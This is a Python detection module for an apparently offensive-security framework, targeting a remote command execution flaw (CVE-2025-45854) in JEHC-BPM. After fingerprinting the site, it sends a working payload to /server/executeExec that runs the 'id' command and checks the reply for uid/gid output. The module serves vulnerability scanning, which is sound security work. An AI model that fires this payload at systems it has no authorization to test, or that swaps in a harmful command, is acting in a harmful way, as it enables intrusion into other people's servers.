#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Remote Command Execution vulnerability in the component /server/executeExec of JEHC-BPM <= v2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'JEHC-BPM - Remote Code Execute Detection',
        'description': 'A Remote Command Execution vulnerability in the component /server/executeExec of JEHC-BPM <= v2.0.1 allows attackers to execute arbitrary code. The vulnerability exists due to insufficient authorization checks in the executeExec endpoint which allows direct command execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'jehc-bpm', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://gist.github.com/Cafe-Tea/bc14b38f4bfd951de2979a24c3358460',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-45854',
        ],
        'cve': 'CVE-2025-45854',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('jehc', 'xshi',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/server/executeExec'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='{\n  "actuator": {\n    "clientIp": "127.0.0.1",\n    "port": 8082,\n    "applicationName": "testApp",\n    "env": "prod",\n    "uploadTime": 1704523200000,\n    "hasPrefixApplicationName": false,\n    "clientHttpPrefix": "http"\n  },\n  "execParams": {\n    "command": "id"\n  }\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=[0-9]+.*gid=[0-9]+.*',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='JEHC-BPM - Remote Code Execute detected', path=path)
            return True
        return False

